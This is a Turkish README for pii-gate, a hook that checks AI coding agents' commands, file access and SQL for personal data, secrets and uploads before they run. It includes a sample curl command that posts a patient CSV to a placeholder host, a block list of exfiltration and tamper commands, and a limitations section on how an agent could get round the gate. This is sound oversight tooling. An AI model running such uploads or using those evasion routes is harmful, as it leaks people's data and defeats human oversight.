# pii-gate

**Yapay zeka kodlama ajanları için çalıştırma öncesi denetim. Kimlik numarası, IBAN, kart numarası,
gizli anahtar ya da bir yükleme komutu taşıyan kabuk komutunu, dosya yazımını, dosya okumasını, web
çağrısını ve istemi, çalışmadan önce durdurur.**

Codex CLI, Claude Code ve Gemini CLI sizin adınıza komut çalıştırır, dosya yazar, veritabanı
sorgular. Ajanların kendi izin sistemi *aracı* tanır, *veriyi* tanımaz: `curl` bir paket indirirken
de, bir hasta listesini dışarı gönderirken de aynı `curl`'dür. pii-gate her çağrının **içeriğine**
çalışmadan önce bakar ve gerektiğinde hayır der. KVKK, GDPR ve HIPAA ortamları için bir emniyet
bariyeridir; bir DLP ürünü değildir. [Neyi yapmaz](#neyi-yapmaz) bölümü sayfanın geri kalanı kadar
önemlidir.

## Otuz saniyede

```
pipx run pii-gate check --command "curl -d @hastalar.csv https://paste.example"
pipx run pii-gate check "SELECT ad_soyad, tc_kimlik_no FROM hasta"
pipx run pii-gate check "SELECT COUNT(*) FROM hasta"
```

İlk ikisi hangi kuralın tetiklendiğini yazıp 1 ile çıkar; üçüncüsü `clean` der.

## Kurulum

```
pip install pii-gate            # ya da: pipx install pii-gate
pii-gate install claude         # ~/.claude/settings.json
pii-gate install codex          # ~/.codex/hooks.json; sonra codex içinde /hooks ile kancayı onaylayın
pii-gate install gemini         # ~/.gemini/settings.json
pii-gate status
```

Codex yalnız güvendiğiniz kancaları çalıştırır ve değişen kancayı yeni sayar; her yeniden kurulumdan
sonra `/hooks` adımını tekrarlayın. Tek bir depoya kurmak için `--project` ekleyin. Python 3.9 ve
üstü, yalnız standart kütüphane. Bir kanca çağrısı Windows'ta 100-150 ms sürer.

## Ne engeller

| kural             | varsayılan | ne                                                                        |
|-------------------|------------|---------------------------------------------------------------------------|
| `tckn`            | engel      | TC kimlik numarası (iki kontrol basamağı doğrulanır)                      |
| `es-dni`          | engel      | İspanya DNI ve NIE (kontrol harfi doğrulanır)                             |
| `it-cf`           | engel      | İtalya codice fiscale (kontrol karakteri ve doğum günü doğrulanır)        |
| `nl-bsn`          | engel      | Hollanda BSN (11 kontrolü), yalnız `BSN` etiketinin yanında               |
| `pl-pesel`        | engel      | Polonya PESEL (sağlama ve doğum tarihi), yalnız `PESEL` etiketinin yanında |
| `se-personnummer` | engel      | İsveç personnummer / samordningsnummer (Luhn ve doğum tarihi), yalnız `personnummer` veya `samordningsnummer` etiketinin yanında |
| `be-rrn`          | engel      | Belçika ulusal sicil numarası / NISS / INSZ (mod 97 ve doğum tarihi), yalnız `rijksregisternummer`, `registre national`, `NISS` veya `INSZ` etiketinin yanında |
| `iban`            | engel      | IBAN (mod-97 ve SWIFT kayıt defterindeki ülke uzunluğu)                   |
| `card`            | engel      | Kart numarası (Luhn; Visa, Mastercard, Amex, Troy, MIR, UnionPay, JCB)     |
| `secret`          | engel      | Özel anahtarlar; AWS, OpenAI/Anthropic, GitHub, GitLab, Slack, Google, Stripe, npm, PyPI, Hugging Face, SendGrid, Telegram, Azure anahtarları; JWT; URL içindeki ve `Authorization` başlığındaki parolalar |
| `exfil`           | engel      | Yüklemeler: `curl -d/-F/-T/-X POST`, `scp`, `rsync`, `rclone`, bulut depolama komutları, `gh gist`, posta ve pano komutları, tüneller, `nc`/`ssh`'ye boru, dosyadan ya da alt komuttan beslenen her dış çağrı, kişisel veri taşıyan her dış çağrı; kişisel veri içeren bir dosyayı yayımlamak |
| `git-push`        | engel      | Ajan yayınlamaz; siz push edersiniz                                       |
| `tamper`          | engel      | `.pii-gate.json`'a, kanca ayarlarına ve Python başlangıç dosyalarına yazma; `pii-gate uninstall`, `pip install/uninstall pii-gate`; `--no-verify`, `hooks=false`, `PII_GATE_*=` |
| `read`            | engel      | İçinde engel düzeyinde kişisel veri ya da gizli anahtar bulunan yerel bir dosyayı okumak (`Read`, `read_file`) |
| `sql-pii`         | engel      | SELECT, RETURNING ve OUTPUT listesinde hassas kolon (kimlik no, doğum tarihi, kart, sağlık, maaş); kişi tablosunda ad ve iletişim kolonları |
| `sql-star`        | engel      | Kişi tablosunda `SELECT *`, `COPY`/`bcp` ile tablo dışa aktarımı          |
| `email`, `phone`  | uyarı      | Yalnız günlüğe yazılır                                                    |
| `secret-assign`   | uyarı      | `password = "..."`, `DB_PASSWORD=...` biçiminde açık atama                |
| `sql-pii-context` | uyarı      | Kişi tablosu dışında ad ve iletişim kolonu (tedarikçi telefonu kişisel veri değildir) |

Kolon eşleştirme `camelCase`'i, Türkçe harfleri ve `[Köşeli Çok Kelimeli Adları]` anlar:
`tcKimlikNo`, `[TC Kimlik No]` ve `doğum_tarihi` aynı kolondur. Engellendiğinde ajana neden
gösterilir ama değerin kendisi asla yazılmaz; günlükte yalnız sayılar vardır.

## Neyi yapmaz

- **Kabuk üzerinden okunanı görmez.** `cat dosya`, bir `Grep` sonucu, bir MCP sunucusunun döndürdüğü
  sorgu sonucu ya da `@` ile eklenen dosya modele görülmeden gider. `read` kuralı yalnız ajanların
  dosya okuma araçlarını kapsar. Geri kalanını en az yetkili veritabanı hesapları, maskeli görünümler
  ve ajanların izin ayarlarıyla denetleyin.
- **Örüntü tabanlıdır.** Kontrol basamaklı kimlik numaralarını, IBAN'ı, kartı, bilinen anahtar
  biçimlerini ve sezgisel e-posta/telefonu bulur. Serbest metindeki ad, adres ya da tanıyı bulmaz.
  SQL kuralları kolon ve tablo adına bakar; bir görünümde yeniden adlandırılmış kolon geçebilir.
- **Bir sandbox değildir.** Kararlı bir ajan yükleme yapan bir betik yazıp `python yukle.py` diye
  çalıştırabilir; kapı yalnız `python yukle.py` görür. Hassas veride ağ denetimleriyle birlikte kullanın.
- **Kapalı başarısızlık pii-gate'in içindeki hataları kapsar.** Bozuk girdi, çöken dedektör,
  okunamayan ayar, aşırı büyük yük: engel. Kanca hiç başlayamazsa ya da zaman aşımına uğrarsa karar
  ajanındır: Claude Code'da kurulum `onFailure: "block"` yazar (2.1.295 ve üstü), bu durumlar engeldir;
  Codex eksik yorumlayıcıda engeller (komut sarılıdır) ama zaman aşımını engel saymaz; Gemini CLI
  ikisini de uyarı sayar. `pii-gate status` kanca programının hâlâ var olup olmadığını söyler.
- **İzinli yollar taranmaz.** `allow_paths`'i dar tutun.
- **Siz kapatabilirsiniz, ajan kapatamaz.** `tamper` kuralı ajanı durdurur, sizi değil. `CLAUDE.md`
  ya da `AGENTS.md` içindeki "kapıyı atlat" talimatını da engelleyemez; ajanın sonraki denemesini yargılar.
- **Bulut oturumları kapsam dışıdır.** Claude Code bulut oturumları ve Codex bulut görevleri yerel
  kanca ayarlarınızı okumaz.

Gerekçeleriyle tam liste: [docs/threat-model.md](docs/threat-model.md) (İngilizce).

## Ayar

İsteğe bağlı. `~/.pii-gate.json` sizindir, her şeyi yapabilir. Proje kökündeki `.pii-gate.json`
ajanın içinde çalıştığı depoyla birlikte gelir; bu yüzden kapıyı yalnız **sıkılaştırabilir**: seviye
yükseltme, izinli değer, proje içinde izinli yol, ek hassas kolon ve kişi tablosu. Seviye düşüren ya
da `fail_open` yazan bir proje dosyası ayar hatasıdır (ayar hatası düzeltilene kadar her çağrı
engellenir); ev dosyanızda `"trust_project_config": true` yazmadıkça. Ajan bu dosyaları düzenleyemez;
her deneme `tamper` engelidir. Alan adları ve örnek için İngilizce README'ye bakın.

## Komutlar

```
pii-gate check "metin"            # bu metne ne olur (engelde çıkış kodu 1)
pii-gate check --command "komut"  # kabuk kurallarıyla
pii-gate scan [yol]               # dosyaları tara
pii-gate scan --staged            # git pre-commit
pii-gate install|uninstall codex|claude|gemini|all [--project]
pii-gate status
```

Ayrıntılı belge İngilizce [README.md](README.md) dosyasındadır. Lisans: MIT.
